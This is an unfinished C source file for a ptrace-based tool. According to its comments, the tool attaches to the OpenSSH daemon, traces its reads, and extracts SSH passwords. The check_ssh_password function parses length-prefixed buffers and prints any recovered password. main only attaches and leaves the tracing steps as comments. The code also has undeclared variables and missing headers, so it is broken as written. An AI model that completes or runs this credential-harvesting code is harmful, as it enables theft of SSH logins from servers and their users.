#include <stdlib.h>
#include <stdio.h>

int pid = 0;

void attach(){
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1){
        printf ("[!] Can't attach pid %d\n", pid); fflush(stdout);
        exit (-1);
    }
    attached = 1;
    waitpid(pid, &status, 0);
    printf("[*] Attached to pid %d.\n", pid); fflush(stdout);
}

void detach(){
    if (ptrace(PTRACE_DETACH, pid , 0, 0) == -1){
        printf ("[!] can't dettach pid %d\n", pid); fflush(stdout);
        exit (-1);
    }
    attached = 0;
    waitpid(pid, &status, 0);
    printf("[*] Dettached.\n"); fflush(stdout);
}

void quit(char *msg, int ret){
    printf("%s\n", msg); fflush (stdout);
    if (attached) detach();
    exit (ret);
}


void check_ssh_password(unsigned char *buff, int len){
	// Password string is | uint | chars |
	if (len > 20 || len < 5) return;

	unsigned char *ptr = buff+len-1;
	//printf("buff: %p, ptr: %p, len: %d\n", buff, ptr, len);
	
	while (*ptr != 0x00) ptr--;
	//printf("ptr: %p\n", ptr);

	// Now we must have two bytes 0x00 at left and one < 0x0f at right
	//printf("*ptr+1: 0x%02x, ptr-1: 0x%02x, ptr-2: 0x%02x\n", *(ptr+1), *(ptr-1), *(ptr-2)); fflush(stdout);
	if (*(ptr+1) > 0x0f || *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return;

	// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1
	//printf("%d\n", buff+len-1-ptr);
	if (((buff+len-1)-(ptr+1)) != *(ptr+1)) return;

	write(1, ptr+2, *(ptr+1));
}

int main(int argc, char *argv[]) {

	unsigned char *buff = "\x0b\x00\x00\x00\x04\x41\x41\x41\x41";

	// Attach to opensshd
	attach();
	
	// wait until fork
		

	// trace every read
	
	//


	// check_ssh_password(buff, 9);

	return 0;
}
